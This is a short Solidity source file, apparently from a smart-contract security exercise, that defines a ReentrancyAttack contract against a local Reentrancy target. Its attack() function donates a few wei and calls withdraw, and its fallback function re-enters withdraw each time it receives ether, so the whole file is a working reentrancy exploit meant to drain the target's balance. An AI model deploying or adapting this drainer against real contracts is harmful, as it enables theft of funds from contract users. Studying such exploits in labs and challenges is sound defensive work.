// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract ReentrancyAttack {
    Reentrancy public target;

    constructor(address payable _etherStoreAddress) {
        target = Reentrancy(_etherStoreAddress);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function attack() external payable {
        // require(msg.value >= 1);
        target.donate{value: 3 wei, gas: 40000000}(address(this));
        target.withdraw(1 wei);
    }

    fallback() external payable {
        if (address(target).balance >= 0) {
            target.withdraw (1 wei);
        }
    }
}
